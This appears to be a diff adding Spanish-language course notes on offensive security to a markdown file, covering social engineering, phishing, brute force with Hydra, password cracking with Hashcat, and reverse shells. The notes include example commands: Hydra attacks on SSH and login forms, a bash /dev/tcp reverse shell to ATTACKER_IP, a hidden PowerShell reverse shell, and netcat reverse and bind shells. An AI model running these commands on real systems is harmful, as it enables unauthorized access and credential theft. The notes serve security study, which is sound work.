@@ -379,3 +379,160 @@ Una **Reverse Shell** es un tipo de shell donde el **sistema comprometido** (cli
 - El sistema objetivo se conecta a un puerto específico en el servidor atacante.
 - Evita bloqueos de firewall o NAT que podrían prevenir conexiones entrantes.
 - El atacante puede ejecutar comandos de manera remota en el sistema comprometido.
+
+# Ingeniería Social y Manipulación de Información
+
+## ¿Qué es la Ingeniería Social?
+- Arte de manipular personas para obtener información confidencial o comprometer sistemas.
+- **Diferencias con ataques técnicos**:
+  - Explota la confianza y naturaleza humana.
+  - Es una de las tácticas más efectivas al aprovechar el "eslabón más débil": el ser humano.
+- **Aprovechamiento de vulnerabilidades**: 
+  - Explota brechas en aplicaciones y comportamientos de las víctimas.
+
+## Técnicas Comunes de Ingeniería Social
+- **Pretexting**: Crear escenarios falsos para obtener información. Ejemplo: hacerse pasar por soporte técnico.
+- **Baiting**: Usar señuelos (como USBs infectados) para atraer víctimas.
+- **Impersonation**: Hacerse pasar por alguien confiable (colega o personal de TI).
+- **Quid Pro Quo**: Ofrecer beneficios a cambio de información o acceso.
+
+---
+
+# Phishing y Variantes
+
+## Phishing
+- Técnica para engañar a personas usando correos, sitios web o mensajes falsos para robar información confidencial.
+  - Ejemplo: Correos que imitan a un banco para pedir datos.
+
+### Derivados del Phishing
+- **Spear Phishing**: Ataques dirigidos a individuos u organizaciones utilizando información personalizada.
+- **Whaling**: Ataques dirigidos a ejecutivos o figuras importantes.
+
+### Variantes
+- **Vishing (Voice Phishing)**:
+  - Uso de llamadas telefónicas para obtener datos. Ejemplo: Suplantar a un banco para verificar identidad.
+- **Smishing (SMS Phishing)**:
+  - Uso de mensajes SMS con enlaces maliciosos o solicitudes de datos.
+  - Ejemplo: Mensaje bancario falso.
+- **Pharming**: Redirigir usuarios a sitios falsos manipulando DNS.
+
+---
+
+# Scams y Fraudes en Línea
+- **Definición**: Estrategias para robar dinero o información manipulando psicológicamente a las víctimas.
+- **Ejemplos**:
+  - Loterías falsas que requieren pagos iniciales.
+  - Soporte técnico falso que cobra por solucionar problemas inexistentes.
+
+---
+
+# Métodos Comunes de Compromiso
+- **Macros Maliciosas**: Archivos de Office con código malicioso.
+- **PDF con JavaScript**: PDFs que ejecutan scripts al abrirse.
+- **Ataques por Enlace de Descarga**: Enlaces que descargan malware automáticamente.
+
+---
+
+# Gophish: Auditorías de Ingeniería Social
+- Herramienta de código abierto para campañas simuladas de phishing.
+  - Características:
+    - Correos personalizados.
+    - Seguimiento de clics y respuestas.
+    - Informes detallados.
+  - Uso:
+    - Entrenar empleados y mejorar políticas de seguridad.
+    - Identificar vulnerabilidades humanas recurrentes.
+
+---
+
+# Ataques de Fuerza Bruta, Diccionarios y Password Spraying
+
+## Fuerza Bruta
+- Probar todas las combinaciones posibles de contraseñas.
+  - **Tipos**:
+    - **Exhaustivo**: Todas las combinaciones.
+    - **Diccionario**: Listas predefinidas de contraseñas comunes.
+
+## Enumeración de Usuarios
+- Identificar nombres válidos en sistemas.
+  - **Métodos**:
+    - Mensajes de error diferenciados.
+    - Tiempos de respuesta en sistemas.
+
+---
+
+# Herramientas de Fuerza Bruta/Diccionario
+
+### Hydra
+- Potente herramienta para ataques contra servicios de red.
+  - Ejemplo: `hydra -l admin -P passwords.txt ssh://192.168.1.100`
+- **Opciones Avanzadas**:
+  - Formularios web: `hydra -l admin -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"`
+
+### Diccionarios
+- **RockYou**: Archivo famoso con contraseñas filtradas.
+- **Kaonashi**: Diseñado para tendencias modernas de contraseñas.
+- **SecLists**: Colección variada para pruebas de seguridad.
+- **CeWL**: Genera diccionarios basados en contenido web.
+
+---
+
+# Password Spraying
+- **Definición**: Intentar pocas contraseñas comunes en muchas cuentas para evitar bloqueos.
+- **Estrategia**:
+  - Usa contraseñas genéricas como "123456".
+  - Efectivo en entornos corporativos.
+
+---
+
+# Almacenamiento y Gestión Segura de Contraseñas
+
+## Hashing
+- Convertir contraseñas a cadenas únicas no reversibles.
+  - Ejemplo: SHA-256, bcrypt.
+- **Técnicas adicionales**:
+  - Salting: Añadir valores aleatorios para evitar hashes idénticos.
+
+## Encoding
+- Convertir datos a un formato compatible, reversible, pero no seguro (Ejemplo: Base64).
+
+## Criptografía
+- Cifrado bidireccional para proteger datos con una clave.
+  - Tipos:
+    - Simétrica: Misma clave para cifrar/descifrar.
+    - Asimétrica: Clave pública y privada (Ejemplo: RSA).
+
+---
+
+# Cracking de Contraseñas
+
+## Hashcat
+- Herramienta avanzada para cracking.
+  - Ejemplo básico: `hashcat -m 0 -a 0 hashes.txt rockyou.txt`
+  - Modos de ataque:
+    - Diccionario.
+    - Basados en reglas (variaciones de contraseñas).
+
+---
+
+# Reverse Shells y Acceso Remoto
+
+## Métodos
+- **Reverse Shell**: La víctima inicia la conexión hacia el atacante.
+- **Bind Shell**: El atacante se conecta al puerto expuesto de la víctima.
+- **WebShell**: Scripts maliciosos en servidores web.
+
+### Ejemplos
+- **Linux**: `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`
+- **Windows (PowerShell)**:
+`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.0.1",4444);...`
+
+## Netcat: La Navaja Suiza
+
+Herramienta versátil para conexiones de red.
+
+- Reverse Shell: `nc -e /bin/sh ATTACKER_IP PORT`
+- Bind Shell: `nc -lvp PORT -e /bin/bash`
+  - Usos:
+    - Interactuar con WebShells.
+    - Administración remota.
